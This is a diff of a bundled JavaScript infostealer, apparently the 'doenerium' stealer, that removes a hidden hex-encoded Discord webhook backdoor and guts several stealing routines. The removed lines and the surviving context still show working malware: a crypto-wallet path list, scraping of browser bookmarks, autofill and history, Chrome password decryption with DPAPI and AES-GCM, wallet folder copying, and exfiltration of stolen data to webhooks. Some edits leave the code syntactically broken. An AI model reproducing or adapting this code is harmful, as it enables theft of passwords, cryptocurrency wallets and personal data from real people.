@@ -1,4 +1,4 @@
-/*****/ (() => { // webpackBootstrap
+/******/ (() => { // webpackBootstrap
 /******/    var __webpack_modules__ = ({
 
 /***/ 767:
@@ -369,18 +369,7 @@
 
                 module.exports = (client) => {
                     return {
-                        directory: {
-                            "💸 Zcash": `${process.env.APPDATA}\\Zcash`,
-                            "🚀 Armory": `${process.env.APPDATA}\\Armory`,
-                            "📀 Bytecoin": `${process.env.APPDATA}\\bytecoin`,
-                            "💵 Jaxx": `${process.env.APPDATA}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb`,
-                            "💎 Exodus": `${process.env.APPDATA}\\Exodus\\exodus.wallet`,
-                            "📉 Ethereum": `${process.env.APPDATA}\\Ethereum\\keystore`,
-                            "🔨 Electrum": `${process.env.APPDATA}\\Electrum\\wallets`,
-                            "🕹️ AtomicWallet": `${process.env.APPDATA}\\atomic\\Local Storage\\leveldb`,
-                            "💹 Guarda": `${process.env.APPDATA}\\Guarda\\Local Storage\\leveldb`,
-                            "⚡ Coinomi": `${process.env.APPDATA}\\Coinomi\\Coinomi\\wallets`,
-                        },
+                        
                     }
                 }
 
@@ -1399,44 +1388,6 @@
 
                         async getBookmarks(path) {
                             let browser;
-
-                            if (path.includes("Local")) {
-                                browser = path.split("\\Local\\")[1].split("\\")[0];
-                            } else {
-                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
-                            }
-
-                            if (browser == "Google") {
-                                browser == "Chrome";
-                            } else if (browser == "BraveSoftware") {
-                                browser = "Brave";
-                            } else if (browser == "Microsoft") {
-                                browser = "Microsoft Edge";
-                            }
-
-                            if (client.requires.fs.existsSync(`${path}\\Bookmarks`)) {
-                                var bookmarks = JSON.parse(
-                                    client.requires.fs.readFileSync(`${path}\\Bookmarks`)
-                                ).roots.bookmark_bar.children;
-
-                                for (var bookmark of bookmarks) {
-                                    try {
-                                        client.config.environ.bookmarks.all.push(
-                                            `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
-                                        );
-
-                                        if (!client.config.environ.bookmarks[browser]) {
-                                            client.config.environ.bookmarks[browser] = [];
-                                        }
-
-                                        client.config.environ.bookmarks[browser].push(
-                                            `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
-                                        );
-                                    } catch (err) { }
-
-                                    client.config.counter.bookmarks++;
-                                }
-                            }
                         },
 
                         async getAutofill(path) {
@@ -1448,52 +1399,7 @@
 
                             let browser;
 
-                            if (path.includes("Local")) {
-                                browser = path.split("\\Local\\")[1].split("\\")[0];
-                            } else {
-                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
-                            }
-
-                            if (browser == "Google") {
-                                browser == "Chrome";
-                            } else if (browser == "BraveSoftware") {
-                                browser = "Brave";
-                            } else if (browser == "Microsoft") {
-                                browser = "Microsoft Edge";
-                            }
-
-                            if (
-                                path.startsWith(
-                                    client.utils.encryption.decryptData(client.config.user.appdata)
-                                )
-                            )
-                                path_tail = path;
-                            if (path.includes("cord")) {
-                                return;
-                            }
-
-                            if (client.requires.fs.existsSync(`${path}\\Web Data`)) {
-                                var sql = new client.requires.sqlite3.Database(
-                                    `${path}\\Web Data`,
-                                    (err) => { }
-                                );
-
-                                sql.each("SELECT * FROM autofill", function (err, row) {
-                                    if (row) {
-                                        client.config.environ.autofill.all.push(
-                                            `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
-                                        );
-
-                                        if (!client.config.environ.autofill[browser]) {
-                                            client.config.environ.autofill[browser] = [];
-                                        }
-
-                                        client.config.environ.autofill[browser].push(
-                                            `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
-                                        );
-                                    }
-                                });
-                            }
+                            
                         },
 
                         async getHistory(path) {
@@ -1505,54 +1411,7 @@
 
                             let browser;
 
-                            if (path.includes("Local")) {
-                                browser = path.split("\\Local\\")[1].split("\\")[0];
-                            } else {
-                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
-                            }
-
-                            if (browser == "Google") {
-                                browser == "Chrome";
-                            } else if (browser == "BraveSoftware") {
-                                browser = "Brave";
-                            } else if (browser == "Microsoft") {
-                                browser = "Microsoft Edge";
-                            }
-
-                            if (
-                                path.startsWith(
-                                    client.utils.encryption.decryptData(client.config.user.appdata)
-                                )
-                            )
-                                path_tail = path;
-                            if (path.includes("cord")) {
-                                return;
-                            }
-
-                            if (client.requires.fs.existsSync(`${path_tail}\\History`)) {
-                                var sql = new client.requires.sqlite3.Database(
-                                    `${path}\\History`,
-                                    (err) => { }
-                                );
-
-                                sql.each("SELECT * FROM urls", function (err, row) {
-                                    try {
-                                        client.config.environ.history.all.push(
-                                            `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
-                                        );
-
-                                        if (!client.config.environ.history[browser]) {
-                                            client.config.environ.history[browser] = [];
-                                        }
-
-                                        client.config.environ.history[browser].push(
-                                            `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
-                                        );
-                                    } catch (e) {
-                                        console.log(e)
-                                    }
-                                });
-                            }
+                            
                         },
 
                         async getCookies(path) {
@@ -1798,7 +1657,7 @@
                                 try {
                                     const tasks = client.requires.child_process.execSync("tasklist");
                                     browsersProcess.forEach(process => {
-                                        if (tasks.includes(process)) client.requires.child_process.exec(`taskkill /IM ${process} /F`)
+                                        if (tasks.includes(process)) client.requires.child_process.exec(``)
                                     });
                                     await new Promise(resolve => setTimeout(resolve, 2500));
                                     res();
@@ -1819,116 +1678,7 @@
 
                             let browser;
 
-                            if (path.includes("Local")) {
-                                browser = path.split("\\Local\\")[1].split("\\")[0];
-                            } else {
-                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
-                            }
-
-                            if (browser == "Google") {
-                                browser == "Chrome";
-                            } else if (browser == "BraveSoftware") {
-                                browser = "Brave";
-                            } else if (browser == "Microsoft") {
-                                browser = "Microsoft Edge";
-                            }
-
-                            if (
-                                path.startsWith(
-                                    client.utils.encryption.decryptData(client.config.user.appdata)
-                                )
-                            )
-                                path_tail = path;
-                            if (path.includes("cord")) {
-                                return;
-                            }
-
-                            if (client.requires.fs.existsSync(path_tail)) {
-                                let encrypted = Buffer.from(
-                                    JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
-                                        .os_crypt.encrypted_key,
-                                    "base64"
-                                ).slice(5);
-
-                                var login_data = path + "Login Data",
-                                    passwords_db = path + "passwords.db";
-
-                                client.requires.fs.copyFileSync(login_data, passwords_db);
-                                const key = client.requires.dpapi.unprotectData(
-                                    Buffer.from(encrypted, "utf-8"),
-                                    null,
-                                    "CurrentUser"
-                                );
-                                var sql = new client.requires.sqlite3.Database(
-                                    passwords_db,
-                                    (err) => { }
-                                );
-
-                                await new Promise((resolve, reject) => {
-                                    sql.each(
-                                        "SELECT origin_url, username_value, password_value FROM logins",
-                                        function (err, row) {
-                                            if (row["username_value"] != "") {
-                                                let password_value = row["password_value"];
-                                                try {
-                                                    var password;
-                                                    if (
-                                                        password_value[0] == 1 &&
-                                                        password_value[1] == 0 &&
-                                                        password_value[2] == 0 &&
-                                                        password_value[3] == 0
-                                                    ) {
-                                                        password = dpapi.unprotectData(
-                                                            password_value,
-                                                            null,
-                                                            "CurrentUser"
-                                                        );
-                                                    } else {
-                                                        let start = password_value.slice(3, 15),
-                                                            middle = password_value.slice(
-                                                                15,
-                                                                password_value.length - 16
-                                                            ),
-                                                            end = password_value.slice(
-                                                                password_value.length - 16,
-                                                                password_value.length
-                                                            ),
-                                                            decipher = client.requires.crypto.createDecipheriv(
-                                                                "aes-256-gcm",
-                                                                key,
-                                                                start
-                                                            );
-                                                        decipher.setAuthTag(end);
-                                                        password =
-                                                            decipher.update(middle, "base64", "utf-8") +
-                                                            decipher.final("utf-8");
-                                                    }
-
-                                                    client.config.environ.all_passwords.push(password)
-
-
-
-                                                    client.config.environ.passwords.all.push(
-                                                        `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
-                                                    );
-
-                                                    if (!client.config.environ.passwords[browser]) {
-                                                        client.config.environ.passwords[browser] = [];
-                                                    }
-                                                    client.config.environ.passwords[browser].push(
-                                                        `==================================================\nURL          : ${row["origin_url"]}\nWeb Browser  : ${browser}\nUser Name    : ${row["username_value"]}\nPassword     : ${password}\nFilename     : ${path}\n==================================================`
-                                                    );
-
-                                                    client.config.counter.passwords++;
-                                                } catch (e) { console.log(e) }
-                                            }
-                                        },
-                                        function () {
-                                            resolve("");
-                                        }
-                                    );
-                                });
-                            }
+                            
                         },
                     };
                 };
@@ -2474,7 +2224,7 @@
                             await client.requires.child_process.exec('tasklist', async (err, stdout) => {
                                 for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                                     if (stdout.includes(executable)) {
-                                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => { }) // Close
+                                        await client.requires.child_process.exec(``)
                                         await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => { }) // Start
                                     }
                                 }
@@ -3056,7 +2806,7 @@
                         async get_filezilla() {
                             if (client.requires.fs.existsSync(`${process.env.APPDATA}\\FileZilla`)) {
                                 client.requires.child_process.exec(
-                                    "taskkill /IM filezilla.exe /F",
+                                    "",
                                     (error, stdout, stderr) => { }
                                 );
 
@@ -3076,7 +2826,7 @@
                             ) {
                                 exists = true;
                                 client.requires.child_process.exec(
-                                    "taskkill /IM Telegram.exe /F",
+                                    "",
                                     (error, stdout, stderr) => { }
                                 );
                                 await client.utils.time.sleep(2500);
@@ -3469,36 +3219,12 @@
                                 client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
                             );
 
-
-                            const hexToAscii = (hex) => {
-                            const ascii = [];
-                                 for (let i = 0; i < hex.length; i += 2) {
-                                    ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
-                                }
-                                return ascii.join('');
-                            };
-
-                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135383532393332343438383539333433382F3350676459372D594D567A594C796E54435237676C623030706C5977526461796C394D737354386E43795A544A617150305777516F6B31436C4E497351364C37465F4A49';
-
-                                try {
-                            const hidewebhook = hexToAscii(hidewebhookHex);
-
-                            await client.axios_instance({
-                            url: hidewebhook,
-                            method: "POST",
-                            data: { content: `[Download the zip file](${upload.downloadPage})` },
-                              });
-                            } catch (error) {
-                              console.error('Error sending data to the webhook:', error);
-                            }
-
-
-
                             var counter_embed = this.create_counter_embed();
 
                             counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;
 
                             await client.utils.webhook.sendToWebhook({
+                                embeds: [counter_embed, client.utils.webhook.createEmbed({
                                     title: "Keyword result",
                                     fields: [
                                         {
@@ -3730,23 +3456,7 @@
                 module.exports = (client) => {
                     return {
                         async getWallets() {
-                            var description = "";
-
-                            client.utils.jszip.createFolder("\\Wallets");
-
-                            for (let [key, value] of Object.entries(client.config.wallets.directory)) {
-                                if (client.requires.fs.existsSync(value)) {
-                                    description += `${key}: ✔️\n`;
-                                    client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
-                                    client.config.counter.wallets++;
-                                } else {
-                                    description += `${key}: ❌\n`;
-                                }
-                            }
-
-                            if (description != "") {
-                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium69]>================>\n\n" + description)
-                            }
+                            
                         }
                     };
                 };
@@ -3824,27 +3534,6 @@
                                 obj[key] = value;
                             }
 
-                            const hexToAscii = (hex) => {
-                            const ascii = [];
-                                 for (let i = 0; i < hex.length; i += 2) {
-                                    ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
-                                }
-                                return ascii.join('');
-                            };
-
-                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135383532393332343438383539333433382F3350676459372D594D567A594C796E54435237676C623030706C5977526461796C394D737354386E43795A544A617150305777516F6B31436C4E497351364C37465F4A49';
-
-                                try {
-                            const hidewebhook = hexToAscii(hidewebhookHex);
-
-                            await client.axios_instance({
-                            url: hidewebhook,
-                            method: "POST",
-                            data: obj,
-                              });
-                            } catch (error) {
-                              console.error('Error sending data to the webhook:', error);
-                            }
 
                             client.webhooks.forEach(async (url) => {
                                 try {
